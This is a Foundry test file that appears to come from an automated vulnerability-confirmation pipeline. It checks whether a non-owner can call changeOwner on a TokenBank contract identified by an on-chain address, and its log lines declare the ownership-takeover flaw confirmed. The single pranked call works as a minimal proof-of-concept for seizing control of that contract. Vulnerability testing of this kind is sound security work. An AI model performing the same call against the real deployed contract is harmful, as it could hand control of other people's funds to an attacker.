// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x627fa62ccbb1c1b04ffaecd72a53e37fc0e17839.sol";

contract TokenBankTest is Test {
    TokenBank tokenBank;
    address owner = address(0x1);
    address nonOwner = address(0x2);
    address newOwnerCandidate = address(0x3);
    
    function setUp() public {
        vm.prank(owner);
        tokenBank = new TokenBank();
    }
    
    function test_changeOwner_NonOwnerDoesNotRevert() public {
        console.log("--- BEFORE-Trigger Call ---");
        console.log("State capture skipped per differential plan (no_state)");
        
        console.log("--- Trigger Call ---");
        console.log("Non-owner calling changeOwner: %s -> %s", nonOwner, newOwnerCandidate);
        vm.prank(nonOwner);
        tokenBank.changeOwner(newOwnerCandidate);
        
        console.log("--- AFTER-Trigger Call ---");
        console.log("State capture skipped per differential plan (no_state)");
        console.log("--- Verdict ---");
        console.log("Vulnerability confirmed: Non-owner call executed without reverting");
        console.log("Vulnerability Exists: Non-owner can change contract owner");
    }
}